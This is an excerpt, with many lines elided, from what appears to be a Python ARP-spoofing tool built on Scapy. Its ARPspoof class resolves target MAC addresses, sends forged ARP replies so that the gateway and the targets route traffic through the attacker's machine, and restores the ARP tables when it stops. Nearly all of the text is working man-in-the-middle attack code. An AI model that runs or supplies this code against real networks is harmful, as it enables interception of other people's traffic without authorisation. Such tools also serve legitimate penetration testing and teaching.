...
class ARPspoof(object):
    ...
    def get_range(self, targets):
        if targets is None:
            print(
                "[!] IP address/range was not specified, will intercept only gateway requests and not replies.")
            return None
    ...
    def resolve_target_mac(self, targetip):
        ...
        try:
            ...
            try:
                resp, _ = sndrcv(
                    self.socket2, packet, timeout=2, verbose=False)
    ...
    def spoof(self, arpmode):
        ...
        while self.send:
            ...
            if self.targets is None:
                self.socket2.send(Ether(src=self.mymac,
                                        dst="ff:ff:ff:ff:ff:ff") / ARP(hwsrc=self.mymac,
                                                                       psrc=self.gateway,
                                                                       op=arpmode))
                ...
                for target in self.targets:
                    ...
                    if (targetip != self.myip):
                        ...
                        if targetmac is not None:
                            try:
                                self.socket.send(
                                    ARP(pdst=targetip, psrc=self.gateway, hwdst=targetmac, op=arpmode))
                                self.socket.send(
                                    ARP(pdst=self.gateway, psrc=targetip, hwdst=self.gateway_mac, op=arpmode))
    ...
    def stop(self):
        ...
        if self.targets is None or self.range:
            ...
            pkt = Ether(src=self.gateway_mac, dst="ff:ff:ff:ff:ff:ff") / \
                ARP(hwsrc=self.gateway_mac, psrc=self.gateway, op="is-at")
            ...
            for target in self.targets:
                ...
                if target_mac is not None:
                    print(
                        "[+] Restoring connection {} <--> {} with {} packets for host".format(
                            target_ip, self.gateway, count))
